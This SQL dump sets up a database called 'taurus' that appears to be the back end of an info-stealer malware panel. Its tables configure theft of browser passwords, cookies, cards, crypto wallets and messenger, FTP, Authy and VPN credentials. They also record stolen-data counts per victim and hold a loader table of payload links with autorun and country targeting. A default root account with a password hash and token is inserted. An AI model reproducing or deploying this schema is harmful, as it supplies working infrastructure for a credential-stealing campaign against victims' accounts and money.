SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";
DROP DATABASE IF EXISTS `taurus`;
CREATE DATABASE `taurus`;
use `taurus`

CREATE TABLE `backup` (
  `Id` int(10) NOT NULL,
  `Date` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Size` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Comment` text COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE `banned` (
  `Id` int(11) NOT NULL,
  `Data` text COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE `config` (
  `Chromium` tinyint(4) NOT NULL,
  `Gecko` tinyint(4) NOT NULL,
  `Edge` tinyint(4) NOT NULL,
  `History` tinyint(4) NOT NULL,
  `SysInfo` tinyint(4) NOT NULL,
  `Screenshot` tinyint(4) NOT NULL,
  `CryptoWallets` tinyint(4) NOT NULL,
  `Steam` tinyint(4) NOT NULL,
  `Telegram` tinyint(4) NOT NULL,
  `Discord` tinyint(4) NOT NULL,
  `Jabber` tinyint(4) NOT NULL,
  `Foxmail` tinyint(4) NOT NULL,
  `Outlook` tinyint(4) NOT NULL,
  `FileZilla` tinyint(4) NOT NULL,
  `WinScp` tinyint(4) NOT NULL,
  `Authy` tinyint(4) NOT NULL,
  `NordVpn` tinyint(4) NOT NULL,
  `MaxFilesSize` int(11) NOT NULL,
  `AntiVm` tinyint(4) NOT NULL,
  `SelfDelete` tinyint(4) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `config` (`Chromium`, `Gecko`, `Edge`, `History`, `SysInfo`, `Screenshot`, `CryptoWallets`, `Steam`, `Telegram`, `Discord`, `Jabber`, `Foxmail`, `Outlook`, `FileZilla`, `WinScp`, `Authy`, `NordVpn`, `MaxFilesSize`, `AntiVm`, `SelfDelete`) VALUES
(1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 500, 0, 1);

CREATE TABLE `domain_detect` (
  `Id` int(10) NOT NULL,
  `Group` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Color` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Domains` longtext COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE `grabber` (
  `Id` int(11) NOT NULL,
  `Path` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Mask` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Domains` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Exeptions` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `FileSize` int(11) NOT NULL,
  `Recursive` tinyint(4) NOT NULL,
  `Status` tinyint(4) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE `loader` (
  `Id` int(10) NOT NULL,
  `Link` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Args` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Countries` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `CountryExept` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Domains` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `OnlyCrypto` tinyint(4) NOT NULL,
  `AddAutorun` tinyint(4) NOT NULL,
  `Loads` int(11) NOT NULL,
  `Runs` int(11) NOT NULL,
  `Status` tinyint(4) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE `logs` (
  `Id` int(11) NOT NULL,
  `Uid` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ForUsers` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Checked` tinyint(4) NOT NULL DEFAULT 0,
  `Prefix` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `WinVer` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Date` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Ip` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Country` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Passwords` int(11) NOT NULL,
  `Cookies` int(11) NOT NULL,
  `Cards` int(11) NOT NULL,
  `Forms` int(11) NOT NULL,
  `Domains` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `Comment` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Chromium` tinyint(4) NOT NULL,
  `Gecko` tinyint(4) NOT NULL,
  `Edge` tinyint(4) NOT NULL,
  `Electrum` tinyint(4) NOT NULL,
  `MultiBit` tinyint(4) NOT NULL,
  `Armory` tinyint(4) NOT NULL,
  `Ethereum` tinyint(4) NOT NULL,
  `Bytecoin` tinyint(4) NOT NULL,
  `Jaxx` tinyint(4) NOT NULL,
  `LibertyJaxx` tinyint(4) NOT NULL,
  `Atomic` tinyint(4) NOT NULL,
  `Exodus` tinyint(4) NOT NULL,
  `DashCore` tinyint(4) NOT NULL,
  `Bitcoin` tinyint(4) NOT NULL,
  `Wasabi` tinyint(4) NOT NULL,
  `Daedalus` tinyint(4) NOT NULL,
  `Monero` tinyint(11) NOT NULL,
  `Steam` tinyint(4) NOT NULL,
  `Telegram` tinyint(4) NOT NULL,
  `Discord` tinyint(4) NOT NULL,
  `Pidgin` tinyint(4) NOT NULL,
  `Psi` tinyint(4) NOT NULL,
  `PsiPlus` tinyint(4) NOT NULL,
  `Foxmail` tinyint(4) NOT NULL,
  `Outlook` tinyint(4) NOT NULL,
  `FileZilla` tinyint(4) NOT NULL,
  `WinScp` tinyint(4) NOT NULL,
  `Authy` tinyint(4) NOT NULL,
  `NordVpn` tinyint(4) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE `users` (
  `Id` int(11) NOT NULL,
  `Username` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL,
  `PasswordHash` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `Access` tinyint(4) NOT NULL DEFAULT 0,
  `Token` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `LastOnline` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `users` (`Id`, `Username`, `PasswordHash`, `Access`, `Token`, `LastOnline`) VALUES
(1, 'root', '$2a$04$HC1q5MxVuIqEOYgYpZW0KuPzA7vFFBiyde6vF4dR19bvmKKr3q6EW', 1, 'ZDYlPEHhNsyagWjZSNiwspGQgUhhPZuE', 1595570723);


ALTER TABLE `backup`
  ADD PRIMARY KEY (`Id`);
ALTER TABLE `banned`
  ADD PRIMARY KEY (`Id`);
ALTER TABLE `domain_detect`
  ADD PRIMARY KEY (`Id`);
ALTER TABLE `grabber`
  ADD PRIMARY KEY (`Id`);
ALTER TABLE `loader`
  ADD PRIMARY KEY (`Id`);
ALTER TABLE `logs`
  ADD UNIQUE KEY `id` (`Id`),
  ADD UNIQUE KEY `Uid` (`Uid`);
ALTER TABLE `users`
  ADD PRIMARY KEY (`Id`),
  ADD UNIQUE KEY `user_name` (`Username`);

ALTER TABLE `backup`
  MODIFY `Id` int(10) NOT NULL AUTO_INCREMENT;

ALTER TABLE `banned`
  MODIFY `Id` int(11) NOT NULL AUTO_INCREMENT;

ALTER TABLE `domain_detect`
  MODIFY `Id` int(10) NOT NULL AUTO_INCREMENT;

ALTER TABLE `grabber`
  MODIFY `Id` int(11) NOT NULL AUTO_INCREMENT;

ALTER TABLE `loader`
  MODIFY `Id` int(10) NOT NULL AUTO_INCREMENT;

ALTER TABLE `logs`
  MODIFY `Id` int(11) NOT NULL AUTO_INCREMENT;

ALTER TABLE `users`
  MODIFY `Id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
COMMIT;